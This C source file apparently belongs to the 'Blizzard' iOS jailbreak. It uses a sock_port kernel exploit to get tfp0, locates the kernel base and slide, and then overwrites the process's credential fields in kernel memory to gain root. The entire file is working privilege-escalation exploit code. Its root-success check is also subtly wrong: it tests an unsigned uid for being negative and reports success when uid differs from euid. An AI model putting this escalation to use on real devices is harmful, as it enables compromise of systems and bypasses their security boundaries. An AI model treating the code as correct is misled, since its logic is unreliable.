//
//  blizzardJailbreak.c
//
//  Created by GeoSn0w on 8/10/20.
//  Copyright © 2020 GeoSn0w. All rights reserved.
//

#include "blizzardJailbreak.h"
#include "../sock_port/exploit.h"
#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <netinet/in.h>
#include <mach/mach.h>
#include <sys/mman.h>
#include "../sock_port/kernel_memory.h"
#include "../sock_port/offsetof.h"
#include "../sock_port/offsets.h"
#include "../PatchFinder/patchfinder64.h"
#include "../Kernel Utilities/kernel_utils.h"

mach_port_t tfp0 = 0;
uint64_t KernelBase;

int exploit_init(){
    tfp0 = get_tfp0();
    
    if (MACH_PORT_VALID(tfp0)){
        printf("[+] Successfully got tfp0!\n");
        init_kernel_utils(tfp0);
        KernelBase = grabKernelBase();
        if (!KernelBase) {
            printf("[-] failed to find kernel base\n");
            return 2;
        }
        kernel_slide = (uint32_t)(KernelBase - 0xFFFFFFF007004000);
        int ret = InitPatchfinder(KernelBase, NULL); // patchfinder
        if (ret) {
            printf("[-] Failed to initialize patchfinder\n");
            return 3;
        }
        printf("[+] Initialized patchfinder\n");
        findOurOwnProcess();
        rootifyOurselves();
        return 0;
    } else {
        printf("[!] Could not get tfp0!\n");
        return -1;
    }
   
}

int rootifyOurselves(){
    printf("[i] Preparing to elevate own privileges to ROOT!\n");
    
    uint64_t proc = proc_of_pid(getpid()); // Get our PID's PROC structure.
    uint64_t ucred = rk64(proc + off_p_ucred); //Get our credentials.
    wk32(proc + off_p_uid, 0);
    wk32(proc + off_p_ruid, 0);
    wk32(proc + off_p_gid, 0);
    wk32(proc + off_p_rgid, 0);
    wk32(ucred + off_ucred_cr_uid, 0);
    wk32(ucred + off_ucred_cr_ruid, 0);
    wk32(ucred + off_ucred_cr_svuid, 0);
    wk32(ucred + off_ucred_cr_ngroups, 1);
    wk32(ucred + off_ucred_cr_groups, 0);
    wk32(ucred + off_ucred_cr_rgid, 0);
    wk32(ucred + off_ucred_cr_svgid, 0);
    
    uid_t uid = getuid(), euid = geteuid();
    if (uid<0 || uid!=euid) {
        printf("[+] Successfully got ROOT!\n");
        return 0;
    } else {
        printf("[-] Could NOT get ROOT!\n");
        return -1;
    }
    
    return 0;
}

int rootifyProcessByPid(){
    return 0;
}

uint64_t findOurOwnProcess(){
    static uint64_t self = 0;
    if (!self) {
        self = rk64(current_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
        printf("[+] Found Ourselves at 0x%llx\n", self);
    } else {
        printf("[!] Cannot find our own process!\n");
    }
    return self;
}
